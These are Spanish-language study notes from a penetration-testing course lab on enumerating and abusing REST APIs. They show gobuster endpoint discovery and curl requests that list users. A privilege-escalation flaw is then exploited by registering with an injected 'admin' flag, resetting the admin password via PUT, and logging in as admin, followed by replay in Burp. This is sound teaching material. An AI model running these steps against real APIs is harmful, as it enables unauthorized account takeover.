## 8.3.3. Enumerating and Abusing APIs

En muchos casos, nuestro objetivo de prueba de penetración es una aplicación web de código cerrado construida internamente que se entrega con varias interfaces de programación de aplicaciones (API). Estas API son responsables de interactuar con la lógica de back-end y proporcionar una columna vertebral sólida de funciones a la aplicación web.

Normalmente vamos a realizar pentesting a API's conocidas como _Representational State Transfer_ (REST), las cuales son usadas para varios propositos incluidos autenticacion. En un escenario de caja blanca tendremos toda la documentacion de la API, la cual nos va a ayudar a realizar un test completo del API. En cambio cuando el escenario es una caja negra, debemos descubrir todo por nosotros mismos.

Podemos usar gobuster para realizar ataques de fuerza bruta a los endpoints del API. En este caso el API gateway web server esta escuchando por el puerto 5001 en 192.168.50.16.
Las API tambien siguen el apartado de versionamiento por numeros, resultando en un patron como:
```
/api_name/v1
```

Las API por convención tienden a tener nombres descriptivos  nombres especificos, podemos guiarnos de los mismos para poder usar los wordlist y los pattern de gobuster con la opcion -p para proveer el archivo con este dato.

```
{GOBUSTER}/v1
{GOBUSTER}/v2

# lo podemos hacer de la siguiente manera:
echo "{GOBUSTER}/v1" > pattern
echo "{GOBUSTER}/v2" >> pattern
```

En este caso estamos usando GOBUSTER  para realizar match con cualquier palabra de nuestra worldlist, la cual tiene tambien un numero de version. Para mantener el test simple usaremos 2 versiones.

```
kali@kali:~$ gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.50.16:5001
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Patterns:                pattern (1 entries)
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/06 04:19:46 Starting gobuster in directory enumeration mode
===============================================================
/books/v1             (Status: 200) [Size: 235]
/console              (Status: 200) [Size: 1985]
/ui                   (Status: 308) [Size: 265] [--> http://192.168.50.16:5001/ui/]
/users/v1             (Status: 200) [Size: 241]
```

> **TIP:** Si obtenemos paths como /ui obtendremos la documentacion completa a la API, esto es normal en escenarios de caja blanca pero no en caja negra.

**Inspeccionemos el path /users/v1**

```
kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 241
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Wed, 06 Apr 2022 09:27:50 GMT

{
  "users": [
    {
      "email": "mail1@mail.com",
      "username": "name1"
    },
    {
      "email": "mail2@mail.com",
      "username": "name2"
    },
    {
      "email": "admin@mail.com",
      "username": "admin"
    }
  ]
}
```

En este caso la aplicacion a retornado tres cuentas incluidas las de el usuario administrador.
Ahora usando esta informacion podemos cambiar la estrategia y usar un nuevo comando para que nos busque los paths asociados con el usuario admin usando un wordlist mas sencillo:

```
kali@kali:~$ gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.50.16:5001/users/v1/admin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/06 06:40:12 Starting gobuster in directory enumeration mode
===============================================================
/email                (Status: 405) [Size: 142]
/password             (Status: 405) [Size: 142]

===============================================================
2022/04/06 06:40:35 Finished
===============================================================
```

Al parecer nos a devuelto lo que estabamos buscando, un path con informacion de password, podemos continuar ahora realizando una peticion al path.

```
kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/admin/password
HTTP/1.0 405 METHOD NOT ALLOWED
Content-Type: application/problem+json
Content-Length: 142
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Wed, 06 Apr 2022 10:58:51 GMT

{
  "detail": "The method is not allowed for the requested URL.",
  "status": 405,
  "title": "Method Not Allowed",
  "type": "about:blank"
}
```

En este caso el API nos dice que el metodo GET no esta permitido, lo mas probable es que sea una peticion http tipo POST y por ello es que no nos arroja un 404 NOT FOUND. Si probamos con otro path tipo Login podremos encontrarnos con lo siguiente:

```
kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/login
HTTP/1.0 404 NOT FOUND
Content-Type: application/json
Content-Length: 48
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Wed, 06 Apr 2022 12:04:30 GMT

{ "status": "fail", "message": "User not found"}
```

En este caso nos habla de un not found pero del user, es decir en el api rest tienen mapeado este 404 como un objeto no encontrado. Ahora sabemos que el usuario es admin y para ver si nuestra estrategia tiene sentido o no podemos usar una password dummy para testear la respuesta.

A continuación, intentaremos convertir la solicitud GET anterior en una solicitud POST y proporcionar nuestra carga útil en el formato JSON requerido. Para crear nuestra solicitud, pasaremos primero el nombre de usuario del administrador y la contraseña ficticia como datos JSON mediante el parámetro -d. También especificaremos "json" como "Content-Type" mediante un nuevo encabezado con -H.

```
kali@kali:~$ curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
{ "status": "fail", "message": "Password is not correct for the given username."}
```

El API ha retornado un mensaje que muestra que la autenticacion a fallado, lo que significa que los parametros del api estan correctamente formados.

Como no sabemos la password del usuario admin, intentaremos crear un registro de usuario para ver si es permitido. Esta seria otra estrategia para nuestro ataque.

Vamos a intentar un nuevo ataque registrando un usuario con la siguiente sintaxis agregando la estructura de dato JSON que es necesaria para el body de la peticion:

```
kali@kali:~$curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register

{ "status": "fail", "message": "'email' is a required property"}
```

La API respondió con un mensaje de error indicando que también deberíamos incluir una dirección de correo electrónico. Podríamos aprovechar esta oportunidad para determinar si hay alguna clave administrativa que podamos usar indebidamente. Agreguemos la clave de administrador, seguida de un valor "true".

```
kali@kali:~$curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}
```

Nos hemos registrado correctamente y hemos recibido un [_JSON Web Token_](https://en.wikipedia.org/wiki/JSON_Web_Token) (JWT) authentication token. Para obtener pruebas exactas de que tenemos permisos a nivel de administrador, vamos a usar este token para intentar cambiar la password del usuario admin.
Podemos intentarlos realizando una POST request usando el path password en la API

```
kali@kali:~$ curl  \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'

{
  "detail": "The method is not allowed for the requested URL.",
  "status": 405,
  "title": "Method Not Allowed",
  "type": "about:blank"
}
```

Al parecer hemos obtenido un error  405, al estar queriendo cambiar la password de un usuario estamos generando una actualizacion y los metodos http para esto son put y pathc.
Podemos intentarlo usando el metodo PUT y ver cual sera la salida del mismo.

```
kali@kali:~$ curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
```

No hemos recibido como tal una respuesta del API, podemos asumir que el backend lo ha procesado sin ningun problema asi que podemos realizar la validacion y ver si tenemos acceso al usuario admin con esta nueva password.

```
kali@kali:~$ curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzIxMjgsImlhdCI6MTY0OTI3MTgyOCwic3ViIjoiYWRtaW4ifQ.yNgxeIUH0XLElK95TCU88lQSLP6lCl7usZYoZDlUlo0", "message": "Successfully logged in.", "status": "success"}
```

¡Genial! Logramos tomar el control de la cuenta de administrador aprovechando un error lógico de escalada de privilegios presente en la API de registro.

Este tipo de errores de programación ocurren en diversos grados al crear aplicaciones web que dependen de API personalizadas, a menudo debido a la falta de pruebas y las mejores prácticas de codificación segura.

Hasta ahora, hemos recurrido a curl para evaluar manualmente la API del objetivo y así poder comprender mejor todo el flujo de tráfico.

Sin embargo, este enfoque no escalará correctamente cuando el número de API sea significativo. Por suerte, podemos recrear todos los pasos anteriores desde Burp.

A modo de ejemplo, repliquemos el último intento de inicio de sesión del administrador y lo enviemos al proxy añadiendo --proxy 127.0.0.1:8080 al comando. Una vez hecho esto, desde la pestaña Repetidor de Burp, podemos crear una nueva solicitud vacía y rellenarla con los mismos datos que antes.

![[Pasted image 20251201204524.png]]

A continuación, haremos clic en el botón Send y verificaremos la respuesta entrante en el panel derecho.

![[Pasted image 20251201204541.png]]

¡Genial! Logramos recrear el mismo comportamiento en nuestro proxy, lo que, entre otras ventajas, nos permite almacenar cualquier API probada en su base de datos para su posterior análisis.

Una vez que probamos varias API diferentes, pudimos ir a la pestaña Target y luego al Site map. De esta manera, podemos recuperar el mapa completo de las rutas que hemos estado probando hasta el momento.

![[Pasted image 20251201204723.png]]

Desde el site map de burp podemos rastrear la API que descubrimos y reenviar cualquier solicitud guardada al repetidor o al intruso para realizar más pruebas.

---




